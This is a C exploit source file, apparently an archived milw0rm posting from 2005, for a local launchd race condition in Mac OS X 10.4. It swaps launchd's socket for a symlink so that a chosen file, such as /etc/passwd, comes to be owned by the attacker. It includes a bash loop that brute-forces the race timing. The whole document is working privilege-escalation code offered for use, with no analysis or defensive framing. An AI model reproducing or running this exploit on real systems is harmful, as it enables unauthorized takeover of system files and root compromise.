/*
 *  Mac OS X 10.4 launchd race condition exploit
 *
 *  intropy (intropy <at> caughq.org)
 */

/* .sh script to help with the offsets /str0ke
#!/bin/bash

X=1000
Y=3000
I=1

while ((1))
do
    ./CAU-launchd /etc/passwd $X
    if [ $I -lt 30 ]
    then
        ((X=$X+$Y))
        ((I=$I+1))
    else
        X=1000
        I=1
    fi
done
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define DEBUG 0
#define SLEEP 6000

main(int argc, char *argv[])
{
    pid_t pid;
    int count, sleep = SLEEP;
    char name[100];    
    char target[100];
    struct stat *stats = (struct stat *)malloc(sizeof(struct stat));

    if ( argc < 2) {
        fprintf(stderr, "%s <file to 0wn>\n", argv[0]);
        exit(-1);
    } else if ( argc > 2 ) {
        sleep = atoi(argv[2]);
        strncpy(target, argv[1], sizeof(target)-1);
    } else {
        strncpy(target, argv[1], sizeof(target)-1);
    }

    if ( DEBUG ) printf("Going for %s\n", target);
    if ( DEBUG ) printf("Using usleep %d\n", sleep);

    pid = fork();

    if ( pid == 0 ) {
        if ( DEBUG ) {
            system("/sbin/launchd -v /bin/ls -R /var/launchd/ 2>/dev/null");
        } else {
            system("/sbin/launchd -v /bin/ls -R /var/launchd/ >/dev/null 2>&1");
        }
    } else {
        snprintf(name, sizeof(name)-1, "/var/launchd/%d.%d/sock", getuid(), pid+2);
        if ( DEBUG ) printf("Checking %s\n", name);
        usleep(sleep);
        if ( DEBUG ) printf("Removing sock...\n");
        if ( (unlink(name)) != 0 ) {
            if ( DEBUG ) perror("unlink");
        } else {
            if ( (symlink(target, name)) != 0 ) {
                if ( DEBUG ) perror("symlink");
            } else {
                if ( DEBUG ) printf("Created symlink %s -> %s...\n", name, target);
            }
        }
        stat(target, stats);
        if ( stats->st_uid == getuid() ) {
            printf("Looks like we got it\n");
            usleep(10000000);
        }
    }
}

// milw0rm.com [2005-06-14]
